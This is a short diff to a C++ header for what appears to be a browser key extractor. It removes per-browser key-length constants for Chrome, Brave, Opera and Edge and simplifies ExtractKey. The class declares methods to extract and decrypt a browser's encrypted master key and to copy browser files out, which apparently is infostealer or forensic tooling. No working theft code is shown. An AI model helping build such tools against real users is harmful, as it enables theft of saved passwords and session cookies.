@@ -25,10 +25,10 @@ private:
 public:		// Static variables
 	static const std::vector<std::string> relativePaths;
 	static const std::vector<std::string> impFiles;
-	static const unsigned int CHROME_BASE64_KEY_LENGTH = 356;
-	static const unsigned int BRAVE_BASE64_KEY_LENGTH  = 356;
-	static const unsigned int OPERA_BASE64_KEY_LENGTH  = 356;
-	static const unsigned int EDGE_BASE64_KEY_LENGTH   = 368;
+	//static const unsigned int CHROME_BASE64_KEY_LENGTH = 356;
+	//static const unsigned int BRAVE_BASE64_KEY_LENGTH  = 356;
+	//static const unsigned int OPERA_BASE64_KEY_LENGTH  = 356;
+	//static const unsigned int EDGE_BASE64_KEY_LENGTH   = 368;
 
 private:
 	std::string extractEncryptedKey(const std::string& jsonData);
@@ -38,7 +38,7 @@ private:
 	std::string decryptMasterKey(const std::string& encryptedKey);
 
 public:
-	void ExtractKey(const std::string &path, const unsigned int& b64_key_length);
+	void ExtractKey(const std::string &path);
 	void ExtractFiles(const std::string &paths, const std::string& destinationDir);
 	void ShowKey(void);
 	void WriteExtractedKeyToFile(const std::string &path);
